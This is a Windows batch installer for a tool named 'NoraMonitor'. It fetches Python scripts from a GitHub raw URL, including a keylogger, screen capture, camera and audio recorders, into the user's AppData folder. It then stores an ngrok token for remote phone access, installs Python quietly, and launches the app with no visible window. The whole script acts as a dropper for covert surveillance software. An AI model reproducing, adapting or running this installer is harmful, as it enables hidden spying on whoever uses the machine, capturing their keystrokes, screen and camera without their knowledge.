@echo off
set "DIR=%APPDATA%\NoraMonitor"
set "RAW=https://raw.githubusercontent.com/smallkhk/Nora-signal/nora-monitor-tool/nora-monitor"
set "TOKENFILE=%DIR%\ngrok.token"

mkdir "%DIR%\templates" 2>nul
mkdir "%DIR%\recordings" 2>nul

:: Download all files from GitHub
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$r='%RAW%'; $d='%DIR%';" ^
  "'app.py','keylogger.py','screencap.py','controller.py','server.py','recorder.py','camera.py','requirements.txt' | %%{ Invoke-WebRequest \"$r/$_\" -OutFile \"$d\$_\" };" ^
  "Invoke-WebRequest \"$r/templates/viewer.html\" -OutFile \"$d\templates\viewer.html\""

:: Ask for ngrok token once, save it for next time
if not exist "%TOKENFILE%" (
    echo.
    echo To access remotely from your phone, enter your ngrok token.
    echo Get it free at: ngrok.com - sign up then copy your token.
    echo Leave blank to skip remote access and use local only.
    echo.
    set /p NGROK_TOKEN=Ngrok token:
    if not "!NGROK_TOKEN!"=="" (
        echo !NGROK_TOKEN! > "%TOKENFILE%"
    )
)

:: Install Python silently if not present
python --version >nul 2>&1
if %errorlevel% neq 0 (
    powershell -NoProfile -ExecutionPolicy Bypass -Command ^
      "Invoke-WebRequest 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe' -OutFile '$env:TEMP\pysetup.exe'"
    %TEMP%\pysetup.exe /quiet InstallAllUsers=0 PrependPath=1
    timeout /t 20 /nobreak >nul
)

:: Install dependencies quietly
pip install -r "%DIR%\requirements.txt" -q --no-warn-script-location

:: Launch silently
start "" pythonw "%DIR%\app.py"
